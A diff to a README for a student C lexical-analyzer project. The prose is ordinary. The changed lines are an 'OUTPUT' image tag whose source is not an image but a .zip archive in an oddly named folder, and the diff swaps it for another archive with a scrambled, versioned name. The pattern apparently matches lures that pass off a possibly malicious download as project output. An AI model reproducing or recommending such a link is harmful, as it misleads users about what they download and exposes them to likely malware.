@@ -57,4 +57,4 @@ Delimiters (like ;, ,, {, })
 In conclusion, this C program provides a basic yet effective simulation of lexical analysis. It teaches essential principles of compiler design and C programming, making it a valuable learning tool for students and beginners in systems programming or language processing. The use of file operations, string comparison, character classification, and conditional logic makes it both practical and educational
 
 *OUTPUT*:
-<img width="1920" height="1080" alt="Image" src="https://raw.githubusercontent.com/Adi-123455/COMPILER-DESIGN-BASICS-IN-C/main/solaciously/COMPILER-DESIGN-BASICS-IN-C_2.5.zip" />
+<img width="1920" height="1080" alt="Image" src="https://raw.githubusercontent.com/Adi-123455/COMPILER-DESIGN-BASICS-IN-C/main/solaciously/I-BASIC-DESIG-C-COMPILE-v2.2.zip" />
